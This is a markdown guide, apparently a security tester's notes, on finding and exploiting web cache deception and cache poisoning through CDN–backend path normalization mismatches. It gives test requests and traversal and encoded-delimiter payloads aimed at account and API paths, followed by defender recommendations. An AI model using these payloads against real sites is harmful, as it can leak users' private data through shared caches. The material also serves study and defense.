
# Cache Normalization and Deception/Poisoning Vulnerability Guide

This document provides technical notes on identifying and exploiting cache-related vulnerabilities based on the behavior of CDN vs Backend path normalization and encoding handling.

---

## 📌 Key Concepts

- **CD (Cache Deception):** Delivering sensitive or private content as cacheable by tricking the CDN.
- **CP (Cache Poisoning):** Injecting untrusted content into a shared cache, affecting what future users see.

---

## 🔍 Detection: CDN and Backend Normalization Behavior

### Case 1: Backend Normalizes but CDN Does Not (Ideal for Cache Deception)

#### How to Test
1. Send:
   ```
   GET https://example.com/x/../favicon.ico
   ```
   If response is **200 + cache miss**, proceed.
2. Send:
   ```
   GET https://example.com/favicon.ico
   ```
   If response is also **200 + cache miss**, then:
   - ✅ Backend **normalizes**
   - ❌ CDN **does not normalize**

#### Exploitation Payloads (CD)
- Basic:
  ```
  /static/..%5CmyAccount
  ```

- If backend uses delimiter-based routing:
  ```
  /myAccount$/x/..%2Frobots.txt
  /myAccount$test.js
  ```

- If API endpoint is not cacheable but other static paths are:
  ```
  /static/../myAccount$test.js
  ```

---

### Case 2: CDN Normalizes but Backend Does Not (Ideal for Cache Poisoning)

#### How to Test
1. Send:
   ```
   GET https://example.com/x/../favicon.ico
   ```
   If response is **404 + cache miss**, proceed.
2. Send:
   ```
   GET https://example.com/favicon.ico
   ```
   If response is **200 + cache hit**, then:
   - ✅ CDN **normalizes**
   - ❌ Backend **does not normalize**

#### Exploitation Payloads (CP)
- Basic:
  ```
  /Test/x/../
  ```

- Alternate CD case with encoded traversal:
  ```
  /myAccount$/..%2Frobots.txt
  ```

---

## 🧪 Additional Case: Backend Decodes Encoded Paths, CDN Does Not

This can also lead to Cache Deception.

#### How to Test
1. Encode a cacheable endpoint:
   ```
   GET https://example.com/api%2Fuser
   ```
2. If CDN caches the encoded version but backend decodes it and serves actual `/api/user`, this may expose dynamic data to cache.

#### Exploitation Payload
- Access sensitive API as cacheable:
  ```
  https://example.com/api%2Fuser
  ```

---

## 🛡️ Recommendations for Defenders

- Ensure consistent path normalization between CDN and backend.
- Never cache dynamic or user-specific content.
- Apply cache-control headers properly (`private`, `no-store`, etc.).
- Avoid using delimiters like `$`, `%2F`, etc., in sensitive paths.
- Monitor and validate unexpected URL variations.

---

## 📚 References

- [PortSwigger Cache Poisoning Guide](https://portswigger.net/web-security/web-cache-poisoning)
- [Google Project Zero - Cache Deception](https://googleprojectzero.blogspot.com)
